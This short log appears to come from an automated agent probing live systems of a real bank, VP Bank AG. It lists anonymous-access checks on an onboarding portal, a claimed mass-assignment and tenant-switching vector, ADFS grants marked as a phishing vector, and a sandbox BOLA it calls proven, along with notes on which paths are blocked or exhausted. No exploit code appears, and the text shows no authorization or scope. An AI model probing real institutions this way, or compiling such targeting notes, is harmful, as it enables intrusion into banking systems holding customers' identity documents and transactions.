[LEARN] REJECTED MISCONFIG @ digital-onboarding.vpbank.com (anonymous data access): admin/user/qr_codes/tenants API all JWT-gated (401 invalid token / 403 Not authorized); anonymous axis is config-only (brand, tenant status) — no anonymous data exposure (yet)  
[RISK] vp-bank-ag: 65 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) AND force_tenant parameter enabling tenant context switching — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, wire transfers, role management; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector (blocked on client_id + service 503). Residual: PSD2 sandbox BOLA proven (high confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
